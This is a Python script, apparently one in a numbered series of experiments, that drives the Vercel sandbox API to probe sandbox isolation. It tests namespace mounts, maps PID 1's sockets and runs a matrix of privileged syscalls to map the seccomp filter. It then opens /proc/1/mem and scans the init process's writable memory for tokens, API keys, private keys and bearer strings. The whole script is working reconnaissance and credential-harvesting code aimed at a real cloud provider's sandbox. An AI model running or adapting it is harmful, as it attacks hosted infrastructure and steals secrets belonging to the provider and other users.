# 实验J241: 新ns内mount(区分seccomp/userns) + socket inode映射 + seccomp syscall矩阵 + rw-p补dump
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj241"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) 新 userns+mount ns 内 mount tmpfs (区分 seccomp vs userns)
CODE_A = r'''
import subprocess
def p(*a): print(" ".join(str(x) for x in a), flush=True)
r = subprocess.run("unshare -Urm sh -c 'mkdir -p /tmp/xx && mount -t tmpfs tmpfs /tmp/xx && echo NS_MOUNT_OK && touch /tmp/xx/f && ls /tmp/xx/f && umount /tmp/xx'", shell=True, capture_output=True, text=True, timeout=10)
p("NS_MOUNT", "rc", r.returncode, (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
# 新 ns 内 cat /proc/self/status 看 caps 变化
r = subprocess.run("unshare -Urm sh -c 'grep CapEff /proc/self/status; capsh --print 2>/dev/null | head -5'", shell=True, capture_output=True, text=True, timeout=10)
p("NS_CAPS", "rc", r.returncode, (r.stdout + r.stderr)[:400].replace(chr(10), "|"))
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_NSMOUNT", timeout=100)

# B) socket inode 映射: PID1 fd 的 socket 对应什么
CODE_B = r'''
def p(*a): print(" ".join(str(x) for x in a), flush=True)
# tcp6 表
tcp6 = open("/proc/1/net/tcp6").read().splitlines()[1:]
p("TCP6")
for ln in tcp6:
    parts = ln.split()
    if len(parts) > 9 and parts[3] == "0A":
        inode = parts[9]
        laddr = parts[1].split(":")[0]
        lport = int(parts[1].split(":")[1], 16)
        p("  LISTEN", "inode", inode, "port", lport, "addr", laddr)
# unix 表
unix = open("/proc/1/net/unix").read().splitlines()[1:]
p("UNIX")
for ln in unix:
    parts = ln.split()
    if len(parts) >= 8:
        inode = parts[6]
        if inode in ("1259", "1265", "1290") or len(parts) > 7:
            p("  ", "inode", inode, "type", parts[1], "path", parts[7] if len(parts) > 7 else "")
# 全 unix 列表
for ln in unix:
    parts = ln.split()
    if len(parts) > 7:
        p("  U", parts[6], parts[1], parts[7])
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_SOCKMAP", timeout=100)

# C) seccomp syscall 探测矩阵
CODE_C = r'''
import ctypes
def p(*a): print(" ".join(str(x) for x in a), flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
S = libc.syscall
tests = [
    ("bpf", 321, 0, 0, 0),
    ("keyctl", 250, 0, 0, 0),
    ("perf_event_open", 298, 0, 0, 0),
    ("userfaultfd", 323, 0, 0),
    ("io_uring_setup", 425, 0, 0),
    ("open_by_handle_at", 304, 0, 0, 0),
    ("name_to_handle_at", 303, 0, 0, 0, 0),
    ("fanotify_init", 300, 0, 0, 0),
    ("init_module", 175, 0, 0, 0),
    ("finit_module", 313, 0, 0, 0, 0),
    ("kexec_load", 246, 0, 0, 0, 0),
    ("reboot", 169, 0, 0, 0, 0),
    ("swapoff", 168, 0),
    ("quotactl", 179, 0, 0, 0),
    ("setns", 308, 0, 0, 0),
    ("pivot_root", 155, 0, 0),
    ("chroot", 161, 0),
    ("sethostname", 170, 0, 0),
    ("mount", 165, 0, 0, 0, 0),
    ("umount2", 166, 0, 0),
    ("unshare", 272, 0),
    ("ptrace", 101, 0, 0, 0, 0),
    ("process_vm_readv", 310, 0, 0, 0, 0, 0),
    ("pidfd_open", 434, 0, 0),
    ("clone3", 435, 0, 0, 0),
    ("openat2", 437, 0, 0, 0, 0),
    ("fsopen", 430, 0, 0, 0),
    ("fspick", 433, 0, 0, 0, 0),
    ("move_mount", 429, 0, 0, 0, 0),
    ("open_tree", 428, 0, 0, 0, 0),
    ("kcmp", 312, 0, 0, 0, 0),
    ("memfd_create", 319, 0, 0),
    ("mknod", 133, 0, 0, 0),
]
for t in tests:
    name = t[0]
    args = list(t[1:])
    while len(args) < 6:
        args.append(0)
    try:
        ret = S(*([t[1]] + args))
        err = ctypes.get_errno()
        p(name, "ret", ret, "errno", err)
    except Exception as e:
        p(name, "EXC", repr(e))
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_SYSCALL", timeout=100)

# D) rw-p 段完整 dump (分小段, 每段2MB, 防被杀)
CODE_D = r'''
import os, re
def p(*a): print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
segs = []
for ln in open("/proc/1/maps"):
    parts = ln.split()
    if len(parts) < 2:
        continue
    addr, perm = parts[0], parts[1]
    path = parts[5] if len(parts) > 5 else ""
    if "rw-p" in perm and "libc" not in path and "ld-" not in path:
        lo, hi = (int(x, 16) for x in addr.split("-"))
        if hi - lo > 0:
            segs.append((lo, hi, path))
p("RWSEGS", len(segs))
pat = re.compile(rb"(?:secret|token|api[_-]?key|private[_-]?key|BEGIN [A-Z ]*PRIVATE|eyJ[A-Za-z0-9_-]{20,}\.|[Bb]earer [A-Za-z0-9_\-\.]{16,}|https?://[a-zA-Z0-9\.\-]{6,60}|/[a-zA-Z0-9_\-\./]{4,80}\.sock)")
found = []
for lo, hi, path in segs:
    total = hi - lo
    off = 0
    got = 0
    while off < total:
        n = min(2 * 1024 * 1024, total - off)
        try:
            d = ra(lo + off, n)
        except Exception as e:
            p("SEG_ERR", hex(lo), hex(lo + off), repr(e))
            break
        got += len(d)
        for m in pat.finditer(d):
            s = m.group(0)
            if len(set(s)) > 3:
                found.append((hex(lo + off + m.start()), s[:160]))
        off += n
    p("SEG", hex(lo), hex(hi), "got", got)
p("FOUND", len(found))
for a, s in found[:20]:
    p("  ", a, s[:160])
p("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_RWDUMP", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
